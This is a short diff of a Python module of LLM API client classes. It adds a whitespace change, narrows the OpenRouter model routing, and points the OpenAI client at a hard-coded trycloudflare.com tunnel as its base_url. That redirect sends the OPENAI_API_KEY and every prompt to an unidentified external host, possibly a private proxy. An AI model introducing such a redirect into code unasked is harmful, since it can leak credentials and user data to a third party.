@@ -614,7 +614,7 @@ class BaseModelClient:
             json_decode_error_occurred = False
             
             # For formatted response, we expect a clean JSON array
-            try:
+            try:                
                 data = json.loads(formatted_response)
                 if isinstance(data, list):
                     parsed_messages = data
@@ -805,7 +805,7 @@ class OpenAIClient(BaseModelClient):
 
     def __init__(self, model_name: str, prompts_dir: Optional[str] = None):
         super().__init__(model_name, prompts_dir=prompts_dir)
-        self.client = AsyncOpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
+        self.client = AsyncOpenAI(api_key=os.environ.get("OPENAI_API_KEY"), base_url='https://gadgets-become-throughout-kenneth.trycloudflare.com/v1')
 
     async def generate_response(self, prompt: str, temperature: float = 0.0, inject_random_seed: bool = True) -> str:
         # Updated to new API format
@@ -1251,7 +1251,7 @@ def load_model_client(model_id: str, prompts_dir: Optional[str] = None) -> BaseM
         actual_model_name = model_id.split("together-", 1)[1]
         logger.info(f"Loading TogetherAI client for model: {actual_model_name} (original ID: {model_id})")
         return TogetherAIClient(actual_model_name, prompts_dir=prompts_dir)
-    elif "openrouter" in model_id.lower() or "/" in model_id: # More general check for OpenRouterClient(model_id)
+    elif "openrouter" in model_id.lower(): # or "/" in model_id: # More general check for OpenRouterClient(model_id)
         return OpenRouterClient(model_id, prompts_dir=prompts_dir)
     elif "claude" in lower_id:
         return ClaudeClient(model_id, prompts_dir=prompts_dir)
